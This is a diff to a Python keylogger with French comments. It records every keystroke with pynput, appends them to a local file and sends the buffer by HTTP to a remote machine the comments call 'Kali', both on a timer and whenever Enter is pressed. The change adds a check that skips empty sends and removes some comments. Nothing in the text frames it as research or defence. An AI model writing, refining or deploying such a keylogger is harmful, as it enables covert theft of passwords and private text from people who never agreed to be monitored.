@@ -31,12 +31,11 @@ def send_log_data(data):
         return 
 
     # --- Sauvegarde locale de sécurité (Écriture) ---
-    # Cette étape est faite en premier au cas où la connexion échoue
     try:
         with open(LOG_FILE, "a") as f:
             f.write(data)
     except Exception:
-        pass # Ignore les erreurs d'écriture de fichier
+        pass
 
     # --- Tentative d'envoi à Kali ---
     try:
@@ -45,7 +44,6 @@ def send_log_data(data):
         if response.status_code == 200:
             # SUCCÈS : Vide le buffer pour éviter la répétition du log.
             log_buffer = "" 
-        # Échec HTTP (code != 200) : ne vide PAS le buffer.
              
     except requests.exceptions.RequestException:
         # Échec de la connexion : ne vide PAS le buffer.
@@ -54,7 +52,6 @@ def send_log_data(data):
 def report():
     """
     Fonction d'envoi exécutée en parallèle toutes les INTERVAL_SECONDS.
-    Elle est lancée dans un thread séparé.
     """
     global log_buffer
     
@@ -71,10 +68,12 @@ def on_press(key):
     """
     global log_buffer
     
+    current_key = None
+    
     try:
         # Tente d'obtenir le caractère (A, b, 1, $, etc.)
-        char = key.char
-        log_buffer += char
+        current_key = key.char
+        log_buffer += current_key
         
     except AttributeError:
         # Gère les touches spéciales
@@ -83,8 +82,15 @@ def on_press(key):
             
         elif key == pynput.keyboard.Key.enter:
             log_buffer += "\n"
-            # On force l'envoi immédiatement sur 'ENTER'
-            send_log_data(log_buffer) 
+            
+            # --- VÉRIFICATION CRUCIALE ANTI-ENVOI VIDE ---
+            # Si le buffer contient du texte significatif, on envoie.
+            if log_buffer.strip():
+                send_log_data(log_buffer)
+            
+            # Dans tous les cas (envoyé ou non), on vide le buffer pour repartir à zéro.
+            log_buffer = "" 
+            return # Sort immédiatement après Enter
 
         elif key == pynput.keyboard.Key.backspace:
             # Gère le backspace immédiatement dans le buffer
